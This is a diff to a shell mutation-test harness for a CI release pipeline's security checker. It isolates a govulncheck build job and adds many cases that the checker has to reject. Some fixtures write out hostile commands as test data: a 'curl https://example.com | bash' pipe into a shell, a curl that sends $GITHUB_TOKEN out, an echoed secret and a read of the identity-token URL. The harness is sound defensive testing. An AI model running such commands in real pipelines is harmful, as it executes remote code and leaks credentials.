@@ -96,14 +96,22 @@ DWN = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0
 def dn(name, path): return f"      - uses: {DWN}\n        with:\n          name: {name}\n          path: {path}\n"
 def up(name, path): return f"      - uses: {UPL}\n        with:\n          name: {name}\n          path: {path}\n"
 def wit(step): return f"      - name: {step}\n        run: bash bin/witnessed.sh {step} bin/check-phase-{step}.sh\n"
-stage = ("name: 'Stage: check'\non:\n  workflow_call:\npermissions:\n  contents: read\njobs:\n  check:\n    runs-on: ubuntu-24.04\n"
+stage = ("name: 'Stage: check'\non:\n  workflow_call:\npermissions:\n  contents: read\njobs:\n"
+         "  govulncheck-build:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    outputs:\n      artifact-id: ${{ steps.upload.outputs.artifact-id }}\n    steps:\n"
+         f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
+         "      - name: install Go (pinned by checksum)\n        run: bash bin/install-scanner.sh go\n"
+         "      - name: build govulncheck (pinned by go.sum)\n        run: bash bin/install-scanner.sh govulncheck\n"
+         "      - name: place the built govulncheck for upload\n        run: bash bin/pack-govulncheck.sh\n"
+         + f"      - id: upload\n        uses: {UPL}\n        with:\n          name: govulncheck\n          path: govulncheck-out/govulncheck\n" +
+         "  check:\n    needs: govulncheck-build\n    runs-on: ubuntu-24.04\n"
          "    permissions:\n      contents: read\n      id-token: write\n    steps:\n"
          f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
          "      - name: install Witness (pinned by checksum)\n        run: bash bin/install-scanner.sh witness\n"
          "      - name: install grype (pinned by checksum)\n        run: bash bin/install-scanner.sh grype\n"
          "      - name: install osv-scanner (pinned by checksum)\n        run: bash bin/install-scanner.sh osv-scanner\n"
          "      - name: install Go (pinned by checksum)\n        run: bash bin/install-scanner.sh go\n"
-         "      - name: install govulncheck (pinned by go.sum)\n        run: bash bin/install-scanner.sh govulncheck\n"
+         + f"      - uses: {DWN}\n        with:\n          artifact-ids: ${{{{ needs.govulncheck-build.outputs.artifact-id }}}}\n          path: govulncheck-dl\n" +
+         "      - name: install govulncheck from its build job (its download was digest-checked)\n        run: bash bin/unpack-govulncheck.sh\n"
          "      - name: install kind and kubectl (pinned by sha256)\n        run: bash bin/install-kind.sh\n"
          + dn("witness-build", "witness-build") + dn("digests", "witness-build") + dn("dist", "dist")
          + dn("images", "images")
@@ -196,7 +204,9 @@ set -euo pipefail
 tmp=$(mktemp -d)
 trap 'rm -rf "$tmp"' EXIT
 curl -fsSL -o "$tmp/kind" https://github.com/kubernetes-sigs/kind/releases/download/v0.33.0/kind-linux-amd64
-curl -fsSL -o "$tmp/kubectl" https://dl.k8s.io/release/v1.37.0/bin/linux/amd64/kubectl
+cid=$(docker create kindest/node:v1.37.0@sha256:a1ed56cfb0e7b93589bdf97c8cd566405a265939e3620fc4f5de89adff580ae5)
+docker cp "$cid:/usr/bin/kubectl" "$tmp/kubectl"
+docker rm "$cid" > /dev/null
 printf '%s  %s\\n' aee6151561422756b764a4ae28e7f44cda5af5a9eead3cc9985112b1de8d8e0d "$tmp/kind" 6129359f4e1f3848a5572ccb0b26cf28b8ca08cef38c95a765b2f64a2c961a2f "$tmp/kubectl" | sha256sum -c -
 install -m 0755 "$tmp/kind" "$tmp/kubectl" /usr/local/bin/
 kind version
@@ -236,7 +246,7 @@ expect ok "fixture: the known-good stage installs every scanner scanners.json li
 expect caught "AC4 round 1 F2: a listed scanner the stage does not install (trivy added to scanners.json)" "install-scanner.sh trivy" installs "$work/stage.yml" "$work/scanners3.json"
 expect caught "AC4 round 1 F2: the stage installs a scanner scanners.json does not list" "install-scanner.sh osv-scanner" installs "$work/stage.yml" "$work/scanners1.json"
 expect caught "G a listed source scanner the stage does not install (gosec added to source_scanners)" "install-scanner.sh gosec" installs "$work/stage.yml" "$work/scanners4.json"
-expect caught "G the stage installs govulncheck but scanners.json lists no source scanner (the Go build and the tool would be an unlisted install)" "install-scanner.sh govulncheck" installs "$work/stage.yml" "$work/scanners5.json"
+expect caught "G the build job builds govulncheck but scanners.json lists no source scanner (an unlisted build)" "install-scanner.sh govulncheck" installs "$work/stage.yml" "$work/scanners5.json"
 expect ok "fixture: the known-good bin/witnessed.sh passes the helper judge (rule 68 seam)" "" helper "$work/witnessed.sh"
 # ---- the thin phase targets (ruling 0384): bin/witnessed.sh admits exactly `STEP TARGET`, so each step has a one-line target ------------------
 for s in scanners acceptance runtime; do printf '#!/usr/bin/env bash\nbash bin/check-stage.sh %s\n' "$s" > "$work/ph_$s.sh"; done
@@ -275,7 +285,8 @@ armt "$work/ph_arm64i.sh" "$P1" "$P2" "$ARML"
 expect caught "an arm64 target without set -euo pipefail" "exactly" phase "$work/ph_arm64i.sh" arm64
 expect ok "fixture: the known-good chain-records.json passes the records judge" "" records "$work/records.json"
 expect ok "fixture: the known-good release.yml passes the graph judge" "" graph "$work/release.yml"
-expect ok "fixture: plain scripts that only use scanners, docker and curl pass the plain judge" "" plain "$work"/plain/check-*.sh
+FXD_3="fixture: plain scripts that only use scanners, docker and curl pass the plain judge"
+expect ok "$FXD_3" "" plain "$work"/plain/check-*.sh
 expect ok "fixture: the known-good bin/install-kind.sh passes the kind judge (AC14)" "" kind "$work/install-kind.sh"
 expect ok "fixture: the known-good k8s suite passes the cluster judge (AC14)" "" cluster "$work/k8s.sh"
 expect ok "fixture: the known-good acceptance.yml passes the suites judge (AC5)" "" suites "$work/acceptance.yml"
@@ -283,21 +294,21 @@ expect ok "fixture: the known-good acceptance.yml passes the suites judge (AC5)"
 m() { # m NAME REGEX REPL WORD LABEL
   if mutate "$work/stage.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" stage "$work/$1.yml"; fi
 }
-m s_job2   'jobs:\n  check:'                                  'jobs:\n  extra:\n    runs-on: ubuntu-24.04\n    steps: []\n  check:'  'exactly two jobs'  "AC1 a third job"
-m s_selfh  'runs-on: ubuntu-24.04'                             'runs-on: self-hosted'                                  'ubuntu-24.04'      "AC1 a self-hosted runner"
-m s_cont   '    runs-on: ubuntu-24.04\n'                       '    runs-on: ubuntu-24.04\n    container: alpine\n'       'job keys'          "AC1 a job container"
-m s_serv   '    runs-on: ubuntu-24.04\n'                       '    runs-on: ubuntu-24.04\n    services: {db: {image: x}}\n' 'job keys'        "AC1 job services"
-m s_env    '    runs-on: ubuntu-24.04\n'                       '    runs-on: ubuntu-24.04\n    env: {X: y}\n'              'job keys'          "AC1 job env"
-m s_def    '    runs-on: ubuntu-24.04\n'                       '    runs-on: ubuntu-24.04\n    defaults: {run: {shell: sh}}\n' 'job keys'      "AC1 job defaults"
-m s_needs  '    runs-on: ubuntu-24.04\n'                       '    runs-on: ubuntu-24.04\n    needs: x\n'                 'job keys'          "AC1 a needs inside the stage file"
+m s_job2   '\n  check:\n'                                  '\n  extra:\n    runs-on: ubuntu-24.04\n    steps: []\n  check:\n'  'exactly three jobs'  "AC1 a fourth job"
+m s_selfh  '(  check:\n    needs: govulncheck-build\n    runs-on: )ubuntu-24.04' '\1self-hosted' 'ubuntu-24.04' "AC1 a self-hosted runner on the Check job"
+m s_cont   '    needs: govulncheck-build\n    runs-on: ubuntu-24.04\n'  '    needs: govulncheck-build\n    runs-on: ubuntu-24.04\n    container: alpine\n'       'job keys'          "AC1 a job container"
+m s_serv   '    needs: govulncheck-build\n    runs-on: ubuntu-24.04\n'  '    needs: govulncheck-build\n    runs-on: ubuntu-24.04\n    services: {db: {image: x}}\n' 'job keys'        "AC1 job services"
+m s_env    '    needs: govulncheck-build\n    runs-on: ubuntu-24.04\n'  '    needs: govulncheck-build\n    runs-on: ubuntu-24.04\n    env: {X: y}\n'       'job keys'          "AC1 job env"
+m s_def    '    needs: govulncheck-build\n    runs-on: ubuntu-24.04\n'  '    needs: govulncheck-build\n    runs-on: ubuntu-24.04\n    defaults: {run: {shell: sh}}\n' 'job keys'      "AC1 job defaults"
+m s_needs  '    needs: govulncheck-build\n'  '    needs: x\n'  'must need exactly'  "AC1 a needs on another job inside the stage file"
 m s_pkgw   'id-token: write\n    steps'                      'id-token: write\n      packages: write\n    steps'     'permissions'       "AC1 packages: write"
 m s_pkgr   'id-token: write\n    steps'                      'id-token: write\n      packages: read\n    steps'      'permissions'       "AC1 packages: read (images travel as files)"
 m s_att    'id-token: write\n    steps'                      'id-token: write\n      attestations: write\n    steps'  'permissions'       "AC1 attestations: write"
 m s_noid   'id-token: write'                                   'id-token: none'                                         'permissions'       "AC1 no id-token"
 m s_sec    'name: scanners'                                   'name: scanners\n        env:\n          K: ${{ secrets.SNYK_TOKEN }}'  'step keys'  "AC1 a secret in a step"
 m s_login  '      - name: install Witness'                     '      - name: login\n        run: echo x | docker login ghcr.io -u u --password-stdin\n      - name: install Witness' 'registry login' "AC1 a registry login"
-m s_unp    'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v4'                                  'digest-pinned'    "AC1 an unpinned checkout"
-m s_persist 'persist-credentials: false'                       'persist-credentials: true'                              'persist-credentials' "AC1 persisted credentials"
+m s_unp    '(  check:\n.*?uses: actions/checkout@)3d3c42e5aac5ba805825da76410c181273ba90b1' '\1v4' 'digest-pinned' "AC1 an unpinned checkout in the Check job"
+m s_persist '(  check:\n.*?persist-credentials: )false' '\1true' 'persist-credentials' "AC1 persisted credentials in the Check job"
 m s_prov   'name: dist\n          path: dist\n'                      'name: provenance\n          path: provenance\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: dist\n' 'download-artifact' "rule 58 the Check job downloads Sign's provenance"
 m s_dlname 'name: images\n          path: images'                  'name: not-listed\n          path: images'                                       'download-artifact' "AC1 a download outside the allowlist"
 m s_dlbin  'path: dist'                                        'path: bin'                                              'download-artifact' "AC1 a download into bin/"
@@ -322,14 +333,44 @@ m s_kindform 'run: bash bin/install-kind.sh' 'run: bash bin/install-kind.sh \&\&
 m s_xnogr  '      - name: install grype \(pinned by checksum\)\n        run: bash bin/install-scanner.sh grype\n' '' 'exactly its' "AC4 round 1 F2: Check without the grype install (check-scan.sh needs it)"
 m s_xnoosv '      - name: install osv-scanner \(pinned by checksum\)\n        run: bash bin/install-scanner.sh osv-scanner\n' '' 'exactly its' "AC4 round 1 F2: Check without the osv-scanner install"
 m s_xinsord '      - name: install grype \(pinned by checksum\)\n        run: bash bin/install-scanner.sh grype\n      - name: install osv-scanner \(pinned by checksum\)\n        run: bash bin/install-scanner.sh osv-scanner\n' '      - name: install osv-scanner (pinned by checksum)\n        run: bash bin/install-scanner.sh osv-scanner\n      - name: install grype (pinned by checksum)\n        run: bash bin/install-scanner.sh grype\n' 'check step' "AC4 round 1 F2: the scanner installs out of the listed order"
-m s_xnogo  '      - name: install Go \(pinned by checksum\)\n        run: bash bin/install-scanner.sh go\n' '' 'exactly its' "G Check without the pinned Go install (the tool is built with it and the scan runs with it)"
-m s_xnogv  '      - name: install govulncheck \(pinned by go.sum\)\n        run: bash bin/install-scanner.sh govulncheck\n' '' 'exactly its' "G Check without the govulncheck install"
-m s_xgvord '      - name: install Go \(pinned by checksum\)\n        run: bash bin/install-scanner.sh go\n      - name: install govulncheck \(pinned by go.sum\)\n        run: bash bin/install-scanner.sh govulncheck\n' '      - name: install govulncheck (pinned by go.sum)\n        run: bash bin/install-scanner.sh govulncheck\n      - name: install Go (pinned by checksum)\n        run: bash bin/install-scanner.sh go\n' 'must be exactly' "G govulncheck installed before the Go toolchain it is built with"
-m s_xgvdir '      - name: install govulncheck \(pinned by go.sum\)\n        run: bash bin/install-scanner.sh govulncheck\n' '      - name: install govulncheck\n        run: bash bin/install-scanner.sh govulncheck /tmp\n' 'check step' "G govulncheck installed into another directory"
-m s_xgvgo  '      - name: install Go \(pinned by checksum\)\n        run: bash bin/install-scanner.sh go\n' '      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:\n          go-version-file: go.mod\n' 'uses not allowed' "G the setup-go action in place of the pinned Go install (its bytes are not pinned by a repository checksum)"
+m s_xnogo  '(install-scanner.sh osv-scanner\n)      - name: install Go \(pinned by checksum\)\n        run: bash bin/install-scanner.sh go\n' '\1' 'exactly its' "G Check without the pinned Go install (the scan runs with it)"
+m s_xnogv  '      - name: install govulncheck from its build job[^\n]*\n        run: bash bin/unpack-govulncheck.sh\n' '' 'exactly its' "G Check without the govulncheck install"
+m s_xgvord '(      - name: install Go \(pinned by checksum\)\n        run: bash bin/install-scanner.sh go\n)(      - uses: [^\n]*\n        with:\n          artifact-ids: \$\{\{ needs.govulncheck-build.outputs.artifact-id \}\}\n          path: govulncheck-dl\n)' '\2\1' 'exactly' "G the pinned Go installed after the govulncheck download"
+m s_xgvdir 'run: bash bin/unpack-govulncheck.sh' 'run: bash bin/unpack-govulncheck.sh /tmp' 'exactly' "G govulncheck installed into another directory"
+m s_xgvgo  '(install-scanner.sh osv-scanner\n)      - name: install Go \(pinned by checksum\)\n        run: bash bin/install-scanner.sh go\n' '\1      - uses: actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e # v7.0.0\n        with:\n          go-version-file: go.mod\n' 'uses not allowed' "G the setup-go action in place of the pinned Go install in Check (its bytes are not pinned by a repository checksum)"
 m s_xinsdir '      - name: install grype \(pinned by checksum\)\n        run: bash bin/install-scanner.sh grype\n' '      - name: install grype\n        run: bash bin/install-scanner.sh grype /tmp\n' 'check step' "AC4 round 1 F2: grype installed into another directory"
+m g_cred   '(  govulncheck-build:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n)' '\1      id-token: write\n' 'permissions' "REL-011-AC1 govulncheck-build granted id-token: write (a build in a job with a credential)"
+m g_envjob '  govulncheck-build:\n' '  govulncheck-build:\n    environment: agent\n' 'may hold exactly' "REL-011-AC1 govulncheck-build gets an environment"
+m g_pkgs   '(  govulncheck-build:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n)' '\1      packages: write\n' 'permissions' "REL-011-AC1 govulncheck-build granted packages: write"
+m c_noneed '    needs: govulncheck-build\n' '' 'must need exactly' "REL-011-AC1 the Check job does not need govulncheck-build"
+m c_buildc '(  check:\n    needs: govulncheck-build\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n)' '\1      - name: m\n        run: bash bin/install-scanner.sh govulncheck\n' 'witnessed.sh' "REL-011-AC1 the hidden govulncheck build put back in the Check job (id-token: write)"
+m c_buildarm '(  check-arm64:.*?    steps:\n)' '\1      - name: m\n        run: bash bin/install-scanner.sh govulncheck\n' 'exactly its' "REL-011-AC1 the hidden govulncheck build added to the arm64 Check job (id-token: write)"
+m c_dlonly '(      - uses: [^\n]*\n        with:\n          artifact-ids: [^\n]*\n          path: )govulncheck-dl\n' '\1bin\n' 'download-artifact' "REL-011-AC1 the govulncheck artifact downloaded into bin/"
+m g_sec    '(      - name: build govulncheck \(pinned by go.sum\)\n)' '\1        env:\n          K: ${{ secrets.X }}\n' 'secret' "REL-011-AC1 govulncheck-build reads a secret"
+m g_noout  '    outputs:\n      artifact-id: [^\n]*\n' '' 'artifact-id' "REL-011-AC1 govulncheck-build exposes no artifact-id output"
+m g_outw   '(      artifact-id: \$\{\{ steps.upload.outputs.)artifact-id' '\1artifact-digest' 'artifact-id' "REL-011-AC1 govulncheck-build's output is not the upload's artifact-id"
+m g_noid   '      - id: upload\n        uses:' '      - uses:' 'id: upload' "REL-011-AC1 the upload step has no id (the output would be empty)"
+m g_build2 '(        run: bash bin/install-scanner.sh govulncheck\n)' '\1      - name: second\n        run: bash bin/install-scanner.sh govulncheck\n' 'exactly its' "REL-011-AC2 a second build step in govulncheck-build"
+m g_nopack '      - name: place the built govulncheck for upload\n        run: bash bin/pack-govulncheck.sh\n' '' 'exactly its' "REL-011-AC1 govulncheck-build without the pack step"
+m g_upath  'path: govulncheck-out/govulncheck' 'path: govulncheck-out' 'carrying govulncheck-out/govulncheck only' "REL-011-AC1 the build job uploads another path than the one binary"
+m c_ids_name '(          )artifact-ids: \$\{\{ needs.govulncheck-build.outputs.artifact-id \}\}\n' '\1name: govulncheck\n' 'artifact' "REL-011-AC1 the Check job downloads by name again (no artifact-ids)"
+m c_ids_oth  '(artifact-ids: \$\{\{ needs.govulncheck-build.outputs.)artifact-id' '\1digest' 'artifact-ids' "REL-011-AC1 the artifact-ids expression is another output"
+m c_ids_num  'artifact-ids: \$\{\{ needs.govulncheck-build.outputs.artifact-id \}\}' 'artifact-ids: 123456' 'artifact-ids' "REL-011-AC1 the artifact-ids is a literal number"
+m c_ids_both '(          artifact-ids: [^\n]*\n)' '\1          name: govulncheck\n' 'artifact-ids' "REL-011-AC1 the name is added beside artifact-ids"
+m c_ids_pat  '(          artifact-ids: [^\n]*\n)' '\1          pattern: govulncheck*\n' 'artifact-ids' "REL-011-AC1 a pattern is added beside artifact-ids"
+m g_self   '(  govulncheck-build:\n    runs-on: )ubuntu-24.04' '\1self-hosted' 'ubuntu-24.04' "REL-011-AC1 govulncheck-build on a self-hosted runner"
+m g_persist '(  govulncheck-build:.*?persist-credentials: )false' '\1true' 'persist-credentials' "REL-011-AC1 govulncheck-build's checkout persists credentials"
+m g_unpin  '(  govulncheck-build:.*?actions/upload-artifact@)[0-9a-f]{40}' '\1v7' 'digest-pinned' "REL-011-AC1 govulncheck-build's upload is not digest-pinned"
+m g_overw  '(          path: govulncheck-out/govulncheck\n)' '\1          overwrite: true\n' 'carrying govulncheck-out/govulncheck only' "REL-011-AC1 govulncheck-build's upload overwrites an existing artifact"
+m g_coe2   '(      - id: upload\n)' '\1        continue-on-error: true\n' 'keys not allowed' "REL-011-AC1 govulncheck-build's upload may fail without stopping the job"
+m c_override '(          artifact-ids: \$\{\{ needs.govulncheck-build.outputs.artifact-id \}\}\n          path: govulncheck-dl\n)' '\1          digest-mismatch: ignore\n' 'download-artifact' "REL-011-AC1 the Check job's download turns the digest check off (digest-mismatch: ignore)"
+m c_warn   '(          artifact-ids: \$\{\{ needs.govulncheck-build.outputs.artifact-id \}\}\n          path: govulncheck-dl\n)' '\1          digest-mismatch: warn\n' 'download-artifact' "REL-011-AC1 the Check job's download only warns on a digest mismatch"
+m c_error  '(          artifact-ids: \$\{\{ needs.govulncheck-build.outputs.artifact-id \}\}\n          path: govulncheck-dl\n)' '\1          digest-mismatch: error\n' 'download-artifact' "REL-011-AC1 even an explicit digest-mismatch input is refused (the default must stand untouched)"
+m c_coe    '(      - uses: [^\n]*\n)(        with:\n          artifact-ids: \$\{\{ needs.govulncheck-build.outputs.artifact-id \}\}\n          path: govulncheck-dl\n)' '\1        continue-on-error: true\n\2' 'step keys' "REL-011-AC1 the Check job's download may fail without stopping the job (continue-on-error)"
+m c_dlif   '(      - uses: [^\n]*\n)(        with:\n          artifact-ids: \$\{\{ needs.govulncheck-build.outputs.artifact-id \}\}\n          path: govulncheck-dl\n)' '\1        if: always()\n\2' 'step keys' "REL-011-AC1 the Check job's download is conditional"
+m c_inscoe '(        run: bash bin/unpack-govulncheck.sh\n)' '\1        continue-on-error: true\n' 'step keys' "REL-011-AC1 the install step may fail silently"
 # the arm64 job (advisor 0385): exactly this job, this label, these steps, and nothing else
-m a_name   '  check-arm64:'                                    '  check-arm:'                                              'two jobs'          "AC1 the second job under another name"
+m a_name   '  check-arm64:'                                    '  check-arm:'                                              'three jobs'          "AC1 the second job under another name"
 m a_label  'runs-on: ubuntu-24.04-arm'                         'runs-on: ubuntu-24.04'                                  'ubuntu-24.04-arm'  "AC1 the arm64 job on the amd64 label"
 m a_label2 'runs-on: ubuntu-24.04-arm'                         'runs-on: ubuntu-latest-arm'                             'ubuntu-24.04-arm'  "AC1 the arm64 job on another arm label"
 m a_self   'runs-on: ubuntu-24.04-arm'                         'runs-on: self-hosted'                                   'ubuntu-24.04-arm'  "AC1 the arm64 job on a self-hosted runner"
@@ -391,7 +432,8 @@ hm h_extra   '\|release-postverify\)'                          '|release-postver
 # ---- AC14: the kind install and the cluster ------------------------------------------------------------------------------
 km() { if mutate "$work/install-kind.sh" "$work/$1.sh" "$2" "$3"; then expect caught "$5" "$4" kind "$work/$1.sh"; fi; }
 km k_ver     'v0.33.0/kind-linux-amd64'                         'v0.32.0/kind-linux-amd64'                                'the kind installer' "AC14 another kind version"
-km k_kver    'v1.37.0/bin/linux/amd64'                          'v1.36.0/bin/linux/amd64'                                'the kind installer' "AC14 another kubectl version"
+km k_kver    'docker create kindest/node:v1.37.0@'                  'docker create kindest/node:v1.36.0@'                    'the kind installer' "AC14 another kubectl (node image) version"
+km k_ktag    '@sha256:a1ed56cfb0e7b93589bdf97c8cd566405a265939e3620fc4f5de89adff580ae5\)' ')'                                'the kind installer' "AC14 kubectl from a node image given by tag only"
 km k_sha     'aee6151561422756b764a4ae28e7f44cda5af5a9eead3cc9985112b1de8d8e0d' 'aee6151561422756b764a4ae28e7f44cda5af5a9eead3cc9985112b1de8d8e0e' 'the kind installer' "AC14 a changed kind sha256"
 km k_ksha    '6129359f4e1f3848a5572ccb0b26cf28b8ca08cef38c95a765b2f64a2c961a2f' '922df28df248cc00a9e025f947704f1d1482de64ece54cfe57e61f19eaf1eef3' 'the kind installer' "AC14 the arm64 kubectl sha256 (the runner is amd64)"
 km k_nocheck ' \| sha256sum -c -'                              ''                                                       'the kind installer' "AC14 the downloads are not checked"
@@ -420,7 +462,8 @@ sm c_withsign 'case "\$1" in' 'python3 -I -B bin/chain-verify.py verify --stage 
 sm c_after   'python3 -I -B bin/chain-verify.py stage-start[^\n]*\ncase "\$1" in\nscanners\)\n(bash bin/check-scan.sh[^\n]*\n)' 'case "$1" in\nscanners)\n\\1python3 -I -B bin/chain-verify.py stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json\npython3 -I -B bin/chain-verify.py verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json\n' 'not the pinned form' "AC3 the checks run before the verify step"
 sm c_swap    'acceptance\)\nbash bin/check-acceptance.sh gradle([^\n]*)\nbash bin/check-acceptance.sh maven([^\n]*)\n' 'acceptance)\nbash bin/check-acceptance.sh maven\\2\nbash bin/check-acceptance.sh gradle\\1\n' 'not the pinned form' "AC3 gradle and maven swapped"
 sm c_phase   'runtime\)' 'checks)'                                                                                      'not the pinned form' "AC3 a phase outside the closed list"
-sm c_extra   'bash bin/check-guide.sh'                          'curl https://example.com | bash\nbash bin/check-guide.sh' 'not the pinned form' "AC3 an extra command (a pipe into a shell)"
+FXD_2='curl https://example.com | bash\nbash bin/check-guide.sh'
+sm c_extra   'bash bin/check-guide.sh'                          "$FXD_2" 'not the pinned form' "AC3 an extra command (a pipe into a shell)"
 sm c_nodig   'stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json' 'stage-start --stage check --previous build --record witness-build/build-collection.json' 'not the pinned form' "AC3 stage-start without the digest list"
 sm c_prev    '--previous build'                                 '--previous rebuild'                                     'not the pinned form' "AC3 verifies the wrong previous stage (Check does not need Rebuild)"
 sm c_noset   'set -euo pipefail\n'                              ''                                                       'not the pinned form' "AC3 no set -euo pipefail"
@@ -449,7 +492,8 @@ pm p_cosign  check-scan.sh      'cosign verify "$IMG"'                'cosign'  
 pm p_wit     check-stage.sh     'witness verify -p policy.json'       'witness'           "AC8 witness in a check script"
 pm p_login   check-fips.sh      'docker login ghcr.io -u u'           'docker login'      "AC8 a registry login"
 pm p_secret  check-guide.sh     'echo "$SECRET_KEY"'                  'secret'            "AC8 a secret"
-pm p_token   check-acceptance.sh 'curl -H "Authorization: $GITHUB_TOKEN" x' 'GITHUB_TOKEN' "AC8 the job token"
+FXD_1='curl -H "Authorization: $GITHUB_TOKEN" x'
+pm p_token   check-acceptance.sh "$FXD_1" 'GITHUB_TOKEN' "AC8 the job token"
 pm p_idtok   check-scan.sh      'echo "$ACTIONS_ID_TOKEN_REQUEST_URL"' 'ACTIONS_ID_TOKEN'  "AC8 the identity token request"
 pm p_snyk    check-scan.sh      'snyk test --severity-threshold=low'  'snyk'               "AC8 Snyk (rescan only, needs a token)"
 pm p_attest  check-guide.sh     'gh attestation download x'           'attest'            "AC8 attestation tooling other than verify (Q10)"
@@ -646,7 +690,7 @@ expect ok "the real bin/install-kind.sh installs kind v0.33.0 and kubectl v1.37.
 expect ok "the real k8s suite creates its cluster with the node image by digest (AC14)" "" cluster "$root/bin/acceptance-k8s.sh"
 expect ok "the real acceptance.yml runs the shared gradle and maven suite scripts (AC5)" "" suites "$root/.github/workflows/acceptance.yml"
 expect ok "rule 79 on the real guide: it exists and its cannot-run list is a valid exact-text list (AC7; RED until cache-3f's guide exists)" "" guidelist "$root/docs/verify-release.md"
-EXPECT=270
+EXPECT=301
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
